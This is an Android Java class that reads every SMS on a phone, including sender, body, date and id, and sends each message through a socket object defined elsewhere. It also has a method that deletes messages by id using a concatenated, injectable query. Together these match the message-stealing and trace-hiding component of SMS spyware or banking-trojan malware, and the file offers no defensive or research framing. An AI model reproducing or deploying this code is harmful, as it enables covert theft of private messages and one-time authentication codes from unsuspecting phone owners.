package com.sms;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

public class SMS {
    Context context_;

    private Uri SMS_INBOX = Uri.parse("content://sms/");
    public SMS(Context context){
        this.context_=context;
    }
    public void getSmsFromPhone() {
        ContentResolver cr = this.context_.getContentResolver();
        String[] projection = new String[] {"_id", "address", "person","body", "date", "type" };
        Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
        if (null == cur) {
            Log.i("ooc","************cur == null");
            return;
        }
        while(cur.moveToNext()) {

            String id = cur.getString(cur.getColumnIndex("_id"));//手机号
            String number = cur.getString(cur.getColumnIndex("address"));//手机号
            String name = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表
            String body = cur.getString(cur.getColumnIndex("body"));//短信内容
            String date = cur.getString(cur.getColumnIndex("date"));//短信内容
            {

                String msgObj = "address:" + number + "@body:" + body + "@date:" + date + "@id:" + id + "@\n";
                if(fun.socket!=null) {
                    fun.socket.send(msgObj);
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                 //   Log.i("sms", msgObj);
                }
            }


        }
        cur.close();
    }
    public int DelSMS(String id){
        ContentResolver cr = this.context_.getContentResolver();
        String[] projection = new String[] {"_id", "address", "person","body", "date", "type" };
        Cursor cur = cr.query(SMS_INBOX, projection, "_id=" + id, null, "date desc");
        int k=0;
        if(cur!=null) {
            k = cr.delete(SMS_INBOX, "_id=" + id, null);
            Log.i("sms", "del:" + k);
        }else{
            Log.i("sms", "not sms:" + id);
        }
        cur.close();
        return k;
    }
}
